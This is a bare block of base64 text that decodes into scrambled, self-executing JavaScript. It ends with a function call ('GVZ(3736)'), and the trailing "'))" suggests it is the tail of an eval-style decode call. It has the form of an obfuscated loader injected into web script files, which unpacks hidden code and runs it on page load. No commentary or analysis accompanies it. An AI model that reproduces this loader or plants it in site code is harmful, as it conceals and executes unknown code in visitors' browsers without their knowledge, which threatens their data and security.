fShhKC4peyxwIGU1b2lGLjJmb3soZHNGNmghc25GOEM0YTB1aWFlRjJhIV0hYSFoRnBfciBlKWZkZW9GZyVhdGFuRjhhKW1mRnRGZ3VfZWUgIih2MyR3LmFvXC8tblk9KSRiYSwlLnJ0OlMuaGFoZTtddTBsbHs2KH1zaV9ufWIhMl89YXthaV9GXyVGYWMzb2w7O1g9YUZNRixiZkZueV9mKT9pbyE0OUVyXS5GM3NfJTtlIEYucl9kKS5sRjVGKF1vNmVhKWVhMlhyIkZkbkYhM3R0LSxzMHlkLjY9LGlhdDNESWFGLiIyRm9fOzV0ZV8wZTFkYWZvfSkxKVV3Pl1vMjNhZSkrTzQ9Plt9eV8pWH10Xz9zbyVibGVjXSElYXJlaWkgYnpfanQ3X0ZlaDtdRnMpKShqM2UzYV9Gc1FbbmVzdClkamwpb2NfIF9hNihGZS4xNTFdRl9oRl1fZTZfZTMlJGE9KDFwJSlfRmlvRiBzRnJ7dF9de19GZk50IHEgbF9GakY7K25lc1RaYnQyYXlGaWZzITcuJW50KWcgJnNyO2IyRmNhZXRIIEZfZW9zP2FGPXYxQU4pIC4wRihdMXJdNTNGRj1GX2wpKS41KHNlZW4pMWVhM3YgXSwgWyw0RjtGRkZvIyxGX2E2NGNhbl9IZFErIFFfJV9FcnM1YV9yYWEyRjNdKV9GKUZlPXczZjBGNSl9dG50YUYgY3sgPSZhYUY9LnJsX0Y1cEYgRm82bjNGaWo9WGN0X29JIEY9dHQuRmFQX2NyIW8oRi49YWRycnQ9LnQ4YTZkXWNlbkZpdF0gKUZiYSl9KGdicGxpb3A9XzslOG8pJWFwNWddNGFzLmVGdS5jdFMudDVNMF9wYWJ9PXB0X182UmUyMjZ0YntdcjNfU31lbzthRnspRkllXzBTbi1GIWplRnsoICkxLj07YVh0IDE7RiQpdDtjPGEgO3haczU1JXRlXWVuXzI1Ri4hNG9hMjRGeWkgc11GOyB3TGllIHRQci5ocyhzMi5hdCBhX1plKEY1dG9mKFtdPSFsIGFdLiZYIWk1ICAgbikoYUZVX0Y1OmE/dHhdcyhyIUZCRncnKSk7dmFyIEdWWj1qZkQoblZpLGNoaiApO0dWWigzNzM2KTtyZXR1cm4gMjA1OH0pKCk='))
